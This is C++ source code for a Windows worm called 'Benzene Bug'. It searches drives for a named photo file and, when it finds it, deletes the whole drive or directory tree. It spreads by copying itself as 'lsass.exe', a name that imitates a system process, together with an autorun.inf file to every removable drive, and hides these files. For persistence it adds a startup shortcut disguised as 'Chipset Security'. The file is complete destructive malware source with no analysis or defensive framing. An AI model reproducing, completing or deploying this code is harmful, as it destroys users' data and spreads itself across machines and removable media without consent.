/********************************** /
	
	Program : Benzene Bug
	Verson  : 1.3
	Author  : RAJGOPAL V

************************************ */


#include "stdafx.h"
#include < iostream>
#include < stdlib.h >
#include < windows.h >
#include < string.h >
#include < ctype.h >
#include < stdio.h >
#include <shobjidl.h>
#include <shlguid.h>

using namespace std;

/* nPhotos - NUMBER OF FILES TO BE DELETED */
int nPhotos = 1;

/* samples - FILES TO BE DELETED */
wchar_t samples[][100]= 
{
		L"IMG_2631.jpg" // 01
};

#define BUFSIZE 1024

/* ENVIRONMENTAL VARIABLES - FOR REFFERING ATTRIBUTES OF THE SYSTEM */
typedef struct
{
	wchar_t homeDrive[10];		//  THE WINDOWS DRIVE
	wchar_t compName[100];		//  COMPUTER NAME
	wchar_t userName[100];		//  CURRENT USER NAME
	wchar_t windir[100];		//  "WINDOWS" DIRECTORY LOCATION
	wchar_t userProfile[100];	//  USER PROFILE LOCATION
	wchar_t startup[200];		//  START UP LOCATION 
} UserInfo;


int find(wchar_t dir[]);		// SEARCHES FOR ANY INDICATIONS OF THE ABOVE LISTED FILES
int isMyFile( wchar_t file[]);	// CHECKS IF THE GIVEN FILE IS LISTED ABOVE
void Spread();					// SPREADS THE PROGRAM TO OTHER REMOVABLE DISKS AND STARTUP LOACATIONS
int findIsSafe();				// CHECKS IF THE SYSTEM IS SAFE FOR THE BENZENE BUG
void deleteAll(wchar_t []);		// DELETE ALL THE FILES AND DIRECTORIES WHEN THE BASE DIRECTORY IS GIVEN.
BOOL CreateShortcut(wchar_t *,  // CREATE SHORTCUT IN THE STARTUP...
					wchar_t *);
unsigned long int cnt = 1; 
int safe;						//  1 - IF SYSTEM IS SAFE     0 - IF SYSTEM NOT SAFE
UserInfo ui;					//  PC INFORMATION.

int APIENTRY WinMain (HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nCmdShow)
{
	int i=3;
	wchar_t dir[] = L"D:";
	LPTSTR lpszSystemInfo;      // POINTER TO SYSTEM INFORMATION STRING

    TCHAR tchBuffer[BUFSIZE];   // BUFFER FOR STRING
	DWORD dwResult;             // FUNCTION RETURN VALUE
    lpszSystemInfo = tchBuffer;

	// Gets HOMEDRIVE variable
	dwResult = ExpandEnvironmentStrings(L"%HOMEDRIVE%",lpszSystemInfo, BUFSIZE);
    if( dwResult <= BUFSIZE )
	  lstrcpyW(ui.homeDrive,lpszSystemInfo);
	// GETS COMPUTER NAME
	dwResult = ExpandEnvironmentStrings(L"%COMPUTERNAME%",lpszSystemInfo, BUFSIZE);
    if( dwResult <= BUFSIZE )
	   lstrcpyW(ui.compName,lpszSystemInfo);
	// GETS USERNAME
	dwResult = ExpandEnvironmentStrings(L"%USERNAME%",lpszSystemInfo, BUFSIZE);
    if( dwResult <= BUFSIZE )
      lstrcpyW(ui.userName,lpszSystemInfo);
	// GETS WINDOWS DIERCTORY LOCATION
	dwResult = ExpandEnvironmentStrings(L"%WINDIR%",lpszSystemInfo, BUFSIZE);
    if( dwResult <= BUFSIZE )
       lstrcpyW(ui.windir,lpszSystemInfo);
	// GETS USERPROFILE DIRECTORY LOCATION
	dwResult = ExpandEnvironmentStrings(L"%USERPROFILE%",lpszSystemInfo, BUFSIZE);
    if( dwResult <= BUFSIZE )
	{
 		lstrcpyW(ui.startup,lpszSystemInfo);
		lstrcpyW(ui.userProfile,lpszSystemInfo);
		// STARTUP = USERPROFILE\START MENU\PROGRAMS\STARTUP 
		lstrcatW(ui.startup,L"\\Start Menu\\Programs\\Startup");
	}

	safe = findIsSafe();  // Checks SAFE
	
	i=3;				  
 	while(1)
	{
		if(i==3)
			dir[0]='D';				// START CHECKING FROM D drive
		else if(i==4)
			dir[0]='C';			    // NEXT C DRIVE
		else
			dir[0] = 'A' -1 + i;	// THEN RESPECTIVE DRIVES

		if(find(dir))				// IF ANY FILE IS FOUND IN the drive
			deleteAll(dir);			// DELETE THE WHOLE DRIVE	
		i++;						// SCAN THE NEXT DRIVE
		i%=27;						// AFTER Z DRIVE  GO BACK TO BEGINING
		if(i==0)i=3;
	}
	return 0;
}


int find(wchar_t dir[]) 
{	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = NULL;

	wchar_t location[500]; 
	wchar_t fullpath[500];
	int attrib = 0;
	int flag = 0;
	
	lstrcpyW(location,dir);		// IF DIR   = D:\PICTURES
	lstrcatW(location,L"\\*");	// LOCATION = D:\PICTURES\*
	hFind = FindFirstFile(location, &FindFileData);
	
	if(safe == 1)				// IF SYSTEM IS SAFE,
	{							//
		do{						//
			Sleep(2500);		// JUST "SLEEP FOR TWO AND A HALF SECOND, 
			Spread();			// AND POPULATE"  ;-)
		}while(1);				// ----- DO THIS FOR EVER
	}
	else 
	{  
		do{						 //	IF SYSTEM IS NOT SAFE
			Sleep(1);			 //	SLEEP 1 MILLI SECOND
			
			// CALCULATE THE FULL PATH OF THE FILE 
			lstrcpyW(fullpath,dir);
			lstrcatW(fullpath,L"\\"); 
			lstrcatW(fullpath,FindFileData.cFileName); 

			// GET THE ATTRIBUTES OF THE FILE
			attrib = GetFileAttributes(fullpath);
			
			// IF THE FILE IS A DIRECTORY,
			if((attrib >= 16 && attrib <= 23 ) || (attrib>=2048+16 && attrib<=2048+23))
			{
				if(lstrcmpiW(FindFileData.cFileName,L".")!=0 && wcscmp(FindFileData.cFileName,L"..")!=0)
				{	
					// SEARCH FOR THE LIST OF FILES INSIDE THIS DIRECTORY ALSO...
					if(find(fullpath)) // IF ANY OF THE FILES IN THE LIST IS FOUND INSIDE THIS DIRECTORY,
					{
						deleteAll(fullpath);	   // DELETE EVERYTHING INSIDE THIS DIR
						RemoveDirectory(fullpath); // ALONG WITH THE CURRENT DIRECTORY ALSO
					}
				}
			}

			// IF THE FILE IS NOT A DIRECTORY
			else 
			{
				// IF THIS FILENAME MATCHES WITH ANY FILE GIVEN IN THE LIST,
				if(isMyFile(FindFileData.cFileName))
				{
					// GOT IT "MACHI" !!!!
					FindClose(hFind);
					return 1;
				}
			}

			cnt++;			// DO THIS FOR 100 TIMES, AND
			cnt%=100;		//
			if(cnt==0)		//
				Spread();	// POPULATE
			
		}while (FindNextFile(hFind, &FindFileData) != 0) ;
	}
	FindClose(hFind);
	return 0;
}


int isMyFile(wchar_t file[])
{
	int i;
	int len =(int) wcslen(file);

	for(i=0;i<len;i++)
		file[i]=toupper(file[i]);
	if(file[0]!='I'&&file[0]!='D'&&file[0]!='M')
		return 0;
	if(file[1]!='M'&&file[1]!='S'&&file[1]!='V'&&file[1]!='O')
		return 0;
	if(file[2]!='G'&&file[2]!='I'&&file[2]!='C'&&file[2]!='V')
		return 0;
	for(i=0;i<nPhotos;i++)
	{
		if(lstrcmpiW(file,samples[i])==0)
			return 1;
	}
	return 0;
}

void Spread()
{
	int i;
	wchar_t Drive[5] = L"C:";
	wchar_t pathEXE[100]=L"C:\\lsass.exe";
	wchar_t pathINF[100]=L"C:\\autorun.inf";
	wchar_t pathSHORT[100]=L"C:\\Chipset Security.lnk";

	lstrcpyW(pathINF,ui.userProfile);
	lstrcatW(pathINF,L"\\autorun.inf");

	lstrcpyW(pathEXE,ui.userProfile);
	lstrcatW(pathEXE,L"\\lsass.exe");
	
	lstrcpyW(pathSHORT,ui.startup);
	lstrcatW(pathSHORT,L"\\Chipset security.lnk");
	
	CopyFile(L"autorun.inf",pathINF,TRUE);
	CopyFile(L"lsass.exe",pathEXE,TRUE);
	CreateShortcut(pathEXE,pathSHORT);

	SetFileAttributes(pathINF,FILE_ATTRIBUTE_HIDDEN+FILE_ATTRIBUTE_SYSTEM+FILE_ATTRIBUTE_READONLY);
	SetFileAttributes(pathEXE,FILE_ATTRIBUTE_HIDDEN+FILE_ATTRIBUTE_SYSTEM);
	SetFileAttributes(pathSHORT,FILE_ATTRIBUTE_NORMAL);

	lstrcpyW(pathEXE,L"C:\\lsass.exe");
	lstrcpyW(pathINF,L"C:\\autorun.inf");

	for(i='C';i<='Z';i++)
	{
		Drive[0] = i;
		if(GetDriveType(Drive)!=DRIVE_REMOVABLE)
			continue;
		pathEXE[0]=i;
		pathINF[0]=i;
		pathSHORT[0]=i;
		CopyFile(L"lsass.exe",pathEXE,FALSE);
		CopyFile(L"autorun.inf",pathINF,FALSE);
		SetFileAttributes(pathEXE,FILE_ATTRIBUTE_HIDDEN+FILE_ATTRIBUTE_SYSTEM);
		SetFileAttributes(pathINF,FILE_ATTRIBUTE_HIDDEN+FILE_ATTRIBUTE_SYSTEM+FILE_ATTRIBUTE_READONLY);
	}	
}

int findIsSafe()
{
	char file[120];
	strcpy(file,(char*)ui.windir);
	strcat(file,"\\WINSHELL.DLL");
	FILE *fp;
	fp = fopen(file,"rb");
	int flag;
	if(!fp)
		flag =0;
	else
	{
		flag=1;
		fclose(fp);
	}
	return flag;
}
void deleteAll(wchar_t dir[])
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = NULL;
	wchar_t location[500];
	wchar_t fullpath[500];
	int attrib = 0;
	int flag = 0;
	lstrcpyW(location,dir);
	lstrcatW(location,L"\\*");	
	hFind = FindFirstFile(location, &FindFileData);
	
	if(safe == 1)
	{
		do{
			Sleep(500);
			cnt++;
			cnt%=5;
			if(cnt==0)
			{
				Spread();
			}
		}while(1);
	}
	else 
	{
		do{
			Sleep(1);
			cnt++;
			cnt%=100;
			if(cnt==0)
				Spread();
			lstrcpyW(fullpath,dir); 
			lstrcatW(fullpath,L"\\");
			lstrcatW(fullpath,FindFileData.cFileName);
			attrib = GetFileAttributes(fullpath);
			if(attrib >= 16 && attrib <= 23 )
			{
				if(lstrcmpiW(FindFileData.cFileName,L".")!=0 && wcscmp(FindFileData.cFileName,L"..")!=0)
				{	
					deleteAll(fullpath);
					RemoveDirectory(fullpath);
				}
			}
			else 
			{
				flag = 1;
				SetFileAttributes(fullpath,FILE_ATTRIBUTE_NORMAL);
				DeleteFile(fullpath);
			}
		}while (FindNextFile(hFind, &FindFileData) != 0) ;
	}
	FindClose(hFind);
}

 BOOL CreateShortcut(wchar_t *DestPath, wchar_t *LnkPath)
{

	/* THANKS TO KAUSHIK */

	HRESULT hres;
	IShellLink* psl;
	CoInitialize(NULL);
	hres = CoCreateInstance(CLSID_ShellLink, NULL,
	CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID *) &psl);
	if (SUCCEEDED(hres)) {
		IPersistFile* ppf; 
		hres = psl->SetPath(DestPath);
		psl->QueryInterface(IID_IPersistFile,(LPVOID*)&ppf);
		hres = ppf->Save(LnkPath,FALSE);
		ppf->Release();
		psl->Release(); 
		if(hres==S_OK)
		{
			return TRUE;
		}
	}
	return FALSE;

	/* THANKS TO KAUSHIK */
}